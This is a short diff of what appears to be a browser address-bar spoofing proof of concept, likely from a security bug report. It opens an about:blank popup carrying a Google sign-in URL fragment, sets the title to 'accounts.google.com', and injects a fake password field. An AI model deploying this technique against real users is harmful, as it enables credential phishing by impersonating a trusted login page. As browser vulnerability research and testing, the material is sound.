@@ -1,7 +1,10 @@
 <script>
 function f(){
-  document.body.innerHTML = "<h1>attacker content before external 204</h1><input autofocus placeholder=password>";
-  setTimeout(function(){ location = "https://httpstat.us/204#https://accounts.google.com/signin" }, 600);
+  w = open("about:blank#https://accounts.google.com/signin", "x", "width=600,height=700");
+  setTimeout(function(){
+    w.document.title = "accounts.google.com";
+    w.document.body.innerHTML = "<h1>attacker about:blank page</h1><input autofocus placeholder=password>";
+  }, 300);
 }
 </script>
 <a href="#" onclick="f()">click</a>
